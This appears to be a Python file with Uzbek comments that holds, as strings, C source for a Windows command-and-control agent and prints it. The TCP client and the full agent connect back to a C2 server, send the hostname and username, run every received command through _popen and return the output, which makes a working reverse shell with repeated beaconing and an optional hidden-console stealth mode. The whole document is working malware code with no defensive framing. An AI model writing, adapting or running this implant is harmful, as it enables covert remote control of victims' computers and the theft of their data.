"""
C2 Agent - C Code Implementation
HTTP va TCP orqali aloqa qiluvchi agent kodi
"""

# TCP Client kod namunasi
tcp_client_code = '''
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <ws2tcpip.h>

#pragma comment(lib, "ws2_32.lib")

#define SERVER_IP "127.0.0.1"
#define SERVER_PORT 4444
#define BUFFER_SIZE 4096

int tcp_connect() {
    WSADATA wsa;
    SOCKET sock;
    struct sockaddr_in server;
    char buffer[BUFFER_SIZE];
    int recv_size;

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        printf("WSAStartup failed. Error Code: %d\\n", WSAGetLastError());
        return 1;
    }

    // Create socket
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
        printf("Socket creation failed. Error Code: %d\\n", WSAGetLastError());
        WSACleanup();
        return 1;
    }

    // Setup server address structure
    server.sin_family = AF_INET;
    server.sin_port = htons(SERVER_PORT);
    server.sin_addr.s_addr = inet_addr(SERVER_IP);

    // Connect to server
    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        printf("Connection failed. Error Code: %d\\n", WSAGetLastError());
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    printf("[+] Connected to %s:%d\\n", SERVER_IP, SERVER_PORT);

    // Main communication loop
    while (1) {
        memset(buffer, 0, BUFFER_SIZE);
        
        // Receive data from server
        recv_size = recv(sock, buffer, BUFFER_SIZE, 0);
        if (recv_size == SOCKET_ERROR) {
            printf("Recv failed. Error Code: %d\\n", WSAGetLastError());
            break;
        }
        if (recv_size == 0) {
            printf("[!] Connection closed by server\\n");
            break;
        }

        printf("[<] Received: %s\\n", buffer);

        // Execute command and send response
        FILE *fp = _popen(buffer, "r");
        if (fp == NULL) {
            strcpy(buffer, "Command execution failed");
        } else {
            memset(buffer, 0, BUFFER_SIZE);
            fread(buffer, 1, BUFFER_SIZE - 1, fp);
            _pclose(fp);
        }

        // Send response back
        if (send(sock, buffer, strlen(buffer), 0) == SOCKET_ERROR) {
            printf("Send failed. Error Code: %d\\n", WSAGetLastError());
            break;
        }
    }

    closesocket(sock);
    WSACleanup();
    return 0;
}

int main() {
    return tcp_connect();
}
'''

# HTTP Client kod namunasi
http_client_code = '''
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <ws2tcpip.h>

#pragma comment(lib, "ws2_32.lib")

#define SERVER_HOST "example.com"
#define SERVER_IP "127.0.0.1"
#define SERVER_PORT 80
#define BUFFER_SIZE 8192

int http_get_request(const char *path) {
    WSADATA wsa;
    SOCKET sock;
    struct sockaddr_in server;
    char request[BUFFER_SIZE];
    char response[BUFFER_SIZE];
    int recv_size, total_size = 0;

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        printf("WSAStartup failed\\n");
        return 1;
    }

    // Create socket
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
        printf("Socket creation failed\\n");
        WSACleanup();
        return 1;
    }

    // Setup server address
    server.sin_family = AF_INET;
    server.sin_port = htons(SERVER_PORT);
    server.sin_addr.s_addr = inet_addr(SERVER_IP);

    // Connect to server
    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        printf("Connection failed\\n");
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    // Create HTTP GET request
    snprintf(request, BUFFER_SIZE,
        "GET %s HTTP/1.1\\r\\n"
        "Host: %s\\r\\n"
        "User-Agent: Mozilla/5.0\\r\\n"
        "Accept: */*\\r\\n"
        "Connection: close\\r\\n"
        "\\r\\n",
        path, SERVER_HOST);

    // Send HTTP request
    if (send(sock, request, strlen(request), 0) == SOCKET_ERROR) {
        printf("Send failed\\n");
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    printf("[+] HTTP GET request sent to %s\\n", path);

    // Receive response
    while ((recv_size = recv(sock, response, BUFFER_SIZE - 1, 0)) > 0) {
        response[recv_size] = '\\0';
        printf("%s", response);
        total_size += recv_size;
    }

    printf("\\n[+] Total bytes received: %d\\n", total_size);

    closesocket(sock);
    WSACleanup();
    return 0;
}

int http_post_request(const char *path, const char *data) {
    WSADATA wsa;
    SOCKET sock;
    struct sockaddr_in server;
    char request[BUFFER_SIZE];
    char response[BUFFER_SIZE];
    int recv_size, data_len;

    data_len = strlen(data);

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        return 1;
    }

    // Create socket
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
        WSACleanup();
        return 1;
    }

    // Setup server address
    server.sin_family = AF_INET;
    server.sin_port = htons(SERVER_PORT);
    server.sin_addr.s_addr = inet_addr(SERVER_IP);

    // Connect to server
    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    // Create HTTP POST request
    snprintf(request, BUFFER_SIZE,
        "POST %s HTTP/1.1\\r\\n"
        "Host: %s\\r\\n"
        "User-Agent: Mozilla/5.0\\r\\n"
        "Content-Type: application/x-www-form-urlencoded\\r\\n"
        "Content-Length: %d\\r\\n"
        "Connection: close\\r\\n"
        "\\r\\n"
        "%s",
        path, SERVER_HOST, data_len, data);

    // Send HTTP POST request
    if (send(sock, request, strlen(request), 0) == SOCKET_ERROR) {
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    printf("[+] HTTP POST request sent\\n");

    // Receive response
    while ((recv_size = recv(sock, response, BUFFER_SIZE - 1, 0)) > 0) {
        response[recv_size] = '\\0';
        printf("%s", response);
    }

    closesocket(sock);
    WSACleanup();
    return 0;
}

int main() {
    // GET request namunasi
    http_get_request("/api/checkin");
    
    // POST request namunasi
    http_post_request("/api/data", "agent_id=12345&status=online");
    
    return 0;
}
'''

# HTTPS Client kod (Windows WinHTTP kutubxonasi bilan)
https_client_code = '''
#include <windows.h>
#include <winhttp.h>
#include <stdio.h>

#pragma comment(lib, "winhttp.lib")

int https_request() {
    HINTERNET hSession = NULL;
    HINTERNET hConnect = NULL;
    HINTERNET hRequest = NULL;
    
    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;
    LPSTR pszOutBuffer;
    BOOL bResults = FALSE;

    // WinHTTP session ochish
    hSession = WinHttpOpen(L"Mozilla/5.0",
                          WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                          WINHTTP_NO_PROXY_NAME,
                          WINHTTP_NO_PROXY_BYPASS, 0);

    if (hSession) {
        // Server bilan ulanish
        hConnect = WinHttpConnect(hSession, L"example.com",
                                 INTERNET_DEFAULT_HTTPS_PORT, 0);
    }

    if (hConnect) {
        // Request yaratish
        hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/api/checkin",
                                     NULL, WINHTTP_NO_REFERER,
                                     WINHTTP_DEFAULT_ACCEPT_TYPES,
                                     WINHTTP_FLAG_SECURE);
    }

    if (hRequest) {
        // Request yuborish
        bResults = WinHttpSendRequest(hRequest,
                                     WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                     WINHTTP_NO_REQUEST_DATA, 0,
                                     0, 0);
    }

    if (bResults) {
        bResults = WinHttpReceiveResponse(hRequest, NULL);
    }

    // Javobni o'qish
    if (bResults) {
        do {
            dwSize = 0;
            if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) {
                printf("Error in WinHttpQueryDataAvailable\\n");
                break;
            }

            if (dwSize == 0)
                break;

            pszOutBuffer = (LPSTR)malloc(dwSize + 1);
            if (!pszOutBuffer) {
                printf("Out of memory\\n");
                break;
            }

            ZeroMemory(pszOutBuffer, dwSize + 1);

            if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer,
                                dwSize, &dwDownloaded)) {
                printf("Error in WinHttpReadData\\n");
            } else {
                printf("%s", pszOutBuffer);
            }

            free(pszOutBuffer);

        } while (dwSize > 0);
    }

    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);

    return 0;
}

int main() {
    return https_request();
}
'''

# To'liq C2 Agent (HTTP + TCP)
full_agent_code = '''
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>

#pragma comment(lib, "ws2_32.lib")

#define C2_SERVER "127.0.0.1"
#define HTTP_PORT 8080
#define TCP_PORT 4444
#define BUFFER_SIZE 8192
#define SLEEP_TIME 5000  // 5 soniya

// Agent ma'lumotlari
typedef struct {
    char agent_id[64];
    char hostname[256];
    char username[256];
    char ip_address[64];
} AgentInfo;

AgentInfo agent_info;

// Tizim ma'lumotlarini yig'ish
void gather_system_info() {
    DWORD size = sizeof(agent_info.hostname);
    GetComputerNameA(agent_info.hostname, &size);
    
    size = sizeof(agent_info.username);
    GetUserNameA(agent_info.username, &size);
    
    // Agent ID yaratish
    snprintf(agent_info.agent_id, sizeof(agent_info.agent_id), 
             "%s_%s_%d", agent_info.hostname, agent_info.username, 
             GetCurrentProcessId());
}

// HTTP orqali check-in qilish
int http_checkin() {
    WSADATA wsa;
    SOCKET sock;
    struct sockaddr_in server;
    char request[BUFFER_SIZE];
    char response[BUFFER_SIZE];
    int recv_size;

    WSAStartup(MAKEWORD(2, 2), &wsa);
    
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) return -1;

    server.sin_family = AF_INET;
    server.sin_port = htons(HTTP_PORT);
    server.sin_addr.s_addr = inet_addr(C2_SERVER);

    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        closesocket(sock);
        WSACleanup();
        return -1;
    }

    // HTTP POST so'rov
    snprintf(request, BUFFER_SIZE,
        "POST /api/checkin HTTP/1.1\\r\\n"
        "Host: %s\\r\\n"
        "Content-Type: application/json\\r\\n"
        "Content-Length: %d\\r\\n"
        "\\r\\n"
        "{\\"agent_id\\":\\"%s\\",\\"hostname\\":\\"%s\\",\\"username\\":\\"%s\\"}",
        C2_SERVER,
        (int)(strlen(agent_info.agent_id) + strlen(agent_info.hostname) + 
              strlen(agent_info.username) + 50),
        agent_info.agent_id, agent_info.hostname, agent_info.username);

    send(sock, request, strlen(request), 0);
    
    recv_size = recv(sock, response, BUFFER_SIZE - 1, 0);
    if (recv_size > 0) {
        response[recv_size] = '\\0';
    }

    closesocket(sock);
    WSACleanup();
    return 0;
}

// Buyruqni bajarish
void execute_command(const char *cmd, char *output, int max_size) {
    FILE *fp = _popen(cmd, "r");
    if (fp == NULL) {
        strcpy(output, "Command execution failed");
        return;
    }
    
    memset(output, 0, max_size);
    fread(output, 1, max_size - 1, fp);
    _pclose(fp);
}

// TCP orqali buyruq olish va bajarish
int tcp_session() {
    WSADATA wsa;
    SOCKET sock;
    struct sockaddr_in server;
    char buffer[BUFFER_SIZE];
    char output[BUFFER_SIZE];
    int recv_size;

    WSAStartup(MAKEWORD(2, 2), &wsa);
    
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        WSACleanup();
        return -1;
    }

    server.sin_family = AF_INET;
    server.sin_port = htons(TCP_PORT);
    server.sin_addr.s_addr = inet_addr(C2_SERVER);

    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        closesocket(sock);
        WSACleanup();
        return -1;
    }

    // Agent ID yuborish
    send(sock, agent_info.agent_id, strlen(agent_info.agent_id), 0);

    // Buyruqlarni kutish va bajarish
    while (1) {
        memset(buffer, 0, BUFFER_SIZE);
        recv_size = recv(sock, buffer, BUFFER_SIZE, 0);
        
        if (recv_size <= 0) break;

        // Maxsus buyruqlar
        if (strcmp(buffer, "exit") == 0) {
            break;
        } else if (strcmp(buffer, "sysinfo") == 0) {
            snprintf(output, BUFFER_SIZE,
                "Hostname: %s\\nUsername: %s\\nAgent ID: %s\\n",
                agent_info.hostname, agent_info.username, agent_info.agent_id);
        } else {
            execute_command(buffer, output, BUFFER_SIZE);
        }

        send(sock, output, strlen(output), 0);
    }

    closesocket(sock);
    WSACleanup();
    return 0;
}

// Asosiy funksiya
int main() {
    // Konsolni yashirish (stealth rejim)
    #ifdef HIDE_CONSOLE
    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_HIDE);
    #endif

    // Tizim ma'lumotlarini yig'ish
    gather_system_info();

    // Asosiy loop
    while (1) {
        // HTTP orqali check-in
        if (http_checkin() == 0) {
            // Muvaffaqiyatli check-in, TCP session boshlash
            tcp_session();
        }

        // Keyingi urinishgacha kutish
        Sleep(SLEEP_TIME);
    }

    return 0;
}
'''

if __name__ == "__main__":
    print("C2 Agent - C Implementation")
    print("\\n1. TCP Client kod:")
    print(tcp_client_code)
    print("\\n2. HTTP Client kod:")
    print(http_client_code)
    print("\\n3. HTTPS Client kod:")
    print(https_client_code)
    print("\\n4. To'liq C2 Agent kod:")
    print(full_agent_code)
